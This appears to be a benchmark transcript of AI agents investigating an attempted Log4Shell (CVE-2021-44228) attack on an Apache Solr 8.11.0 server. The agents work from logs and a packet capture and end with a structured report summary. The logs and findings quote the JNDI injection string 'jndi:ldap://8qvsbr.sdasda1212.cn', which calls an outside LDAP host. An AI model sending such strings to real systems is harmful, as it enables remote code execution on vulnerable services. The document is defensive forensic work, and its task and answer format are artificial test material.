[Task 6]
Step 1: Report of the log analysis done by the log reporter:

1. **Summary of Relevant and Suspicious Events:**
   - The log indicates the operation of an Apache Solr server, version 8.11.0, running on port 8983. The server is initialized and example data is loaded into a core named 'demo'.
   - A critical error is logged at `2024-09-25 12:53:15.246`, indicating an unsupported operation involving an LDAP URL: `ldap://8qvsbr.sdasda1212.cn`. This suggests a potential attempt to exploit a vulnerability related to JNDI (Java Naming and Directory Interface) lookups, which is a known vector for remote code execution attacks.

2. **Service Involved:**
   - The service involved is Apache Solr, specifically version 8.11.0, as indicated by the log entry: `Welcome to Apache Solr™ version 8.11.0`.

3. **Potential Vulnerabilities and Exploitation Patterns:**
   - The log entry `org.apache.solr.common.SolrException: Unsupported operation: ldap://8qvsbr.sdasda1212.cn` is highly suspicious. It suggests an attempt to exploit a JNDI injection vulnerability, which could potentially lead to remote code execution. This is reminiscent of the Log4Shell vulnerability (CVE-2021-44228) that affected many Java-based applications, including those using Apache Solr.
   - The warning `Not all security plugins configured! authentication=disabled authorization=disabled` indicates that the Solr instance is running without authentication or authorization, making it vulnerable to unauthorized access and exploitation.

4. **Useful Log Excerpts:**
   - `2024-09-25 12:53:15.246 ERROR (qtp1440738283-22) [   ] o.a.s.h.RequestHandlerBase org.apache.solr.common.SolrException: Unsupported operation: ldap://8qvsbr.sdasda1212.cn`
   - `2024-09-25 12:52:04.496 WARN  (main) [   ] o.a.s.c.CoreContainer Not all security plugins configured!  authentication=disabled authorization=disabled.`

5. **Conclusion:**
   - The log reveals a potentially serious security issue with the Apache Solr instance, particularly the attempt to exploit a JNDI-related vulnerability. The lack of authentication and authorization further exacerbates the risk. Immediate action is recommended to secure the Solr instance, including enabling security plugins and investigating the suspicious LDAP URL access attempt. Further analysis of the full packet capture (PCAP) is advised to confirm any exploitation attempts and to identify the source of the suspicious activity.
Step 2: Based on the log analysis, we have identified that the service involved is Apache Solr version 8.11.0, running on port 8983. The log indicates a potential attempt to exploit a JNDI-related vulnerability, which could lead to remote code execution. This is reminiscent of the Log4Shell vulnerability.

To gather evidence of malicious activities associated with this potential vulnerability, we need to analyze the PCAP file for signs of remote code execution attempts or any suspicious LDAP URL access attempts.

Let's proceed by extracting any LDAP-related traffic from the PCAP file to see if there are any signs of such attempts. 

I'll ask the tshark_expert to extract LDAP-related traffic from the PCAP file.
Step 3: Final report from the forensic expert:
After attempting to filter for LDAP traffic on standard ports (389 and 636) and finding no results, I searched for LDAP-related filters in the tshark manual. However, I was unable to find any specific filters that could help identify LDAP packets regardless of the port used. Therefore, I conclude that there is no LDAP-related traffic in the provided PCAP file based on the available information and filtering attempts.
Executed command: -Y "tcp.port == 389"

Command output: No output found for the given command.

Step 4: Based on the log analysis, we have identified that the service involved is Apache Solr version 8.11.0, running on port 8983. The log indicates a potential attempt to exploit a JNDI-related vulnerability, which could lead to remote code execution. This is reminiscent of the Log4Shell vulnerability.

To gather evidence of malicious activities associated with this potential vulnerability, we need to analyze the PCAP file for signs of remote code execution attempts or any suspicious LDAP URL access attempts.

Let's proceed by extracting any LDAP-related traffic from the PCAP file to see if there are any signs of such attempts. 

I'll ask the tshark_expert to extract LDAP-related traffic from the PCAP file.
Step 5: Final report from the forensic expert:
The analysis focused on identifying LDAP or JNDI traffic within the provided PCAP file. Initial attempts to filter for LDAP traffic using the display filter '-Y "ldap"' resulted in no output, indicating no LDAP traffic was present. Subsequent attempts to filter for JNDI traffic using '-Y "jndi"' resulted in an error, as 'jndi' is not recognized as a valid protocol or field in tshark. Manual searches for JNDI-related fields did not yield any relevant results. Finally, an attempt to extract raw payload data using '-T fields -e data' also resulted in no output. Therefore, no LDAP or JNDI traffic or suspicious patterns related to these protocols were found in the PCAP file.
Executed command: -T fields -e data

Command output: No output found for the given command.

Step 6: Based on the log analysis, we have identified that the service involved is Apache Solr version 8.11.0, running on port 8983. The log indicates a potential attempt to exploit a JNDI-related vulnerability, which could lead to remote code execution. This is reminiscent of the Log4Shell vulnerability.

Let's proceed by extracting any LDAP-related traffic from the PCAP file to see if there are any signs of such attempts. 

I'll ask the tshark_expert to extract LDAP-related traffic from the PCAP file.
Step 7: Final report from the forensic expert:
The analysis revealed an HTTP GET request to a URL that includes an LDAP URL within it, specifically 'jndi:ldap://8qvsbr.sdasda1212.cn'. This suggests an attempt to access an LDAP service through a URL embedded in an HTTP request, which could be indicative of an LDAP injection or exploitation attempt. The command to extract the raw payload of the HTTP GET request did not yield any results, possibly due to incorrect field names or filters. However, the presence of the LDAP URL in the HTTP request is a significant finding in itself.
Executed command: -Y "tcp.port == 8983"

Step 8: The analysis of the PCAP file has revealed an HTTP GET request to a URL that includes an LDAP URL, specifically 'jndi:ldap://8qvsbr.sdasda1212.cn'. This suggests an attempt to access an LDAP service through a URL embedded in an HTTP request, which could be indicative of an LDAP injection or exploitation attempt. The HTTP request received a "400 Bad Request" response, which indicates that the server did not process the request successfully.

Given the context of the Apache Solr service and the potential JNDI-related vulnerability, this aligns with the characteristics of the Log4Shell vulnerability. However, the "400 Bad Request" response suggests that the attack may not have been successful.

To finalize the analysis, I will now proceed to provide the final answer, summarizing the findings and conclusions.
Step 9: FINAL REPORT:
The analysis of the PCAP file revealed an HTTP GET request to a URL containing an LDAP URL, specifically 'jndi:ldap://8qvsbr.sdasda1212.cn'. This suggests an attempt to exploit a JNDI-related vulnerability, reminiscent of the Log4Shell vulnerability. The server responded with a '400 Bad Request', indicating that the request was not processed successfully. The Apache Solr service was identified as the affected service, and the lack of authentication and authorization further exacerbates the risk. However, the attack was not successful as indicated by the server's response.
REPORT SUMMARY:
Identified CVE: CVE-2021-44228
Affected Service: Apache Solr
Is Service Vulnerable: True
Attack succeeded: False
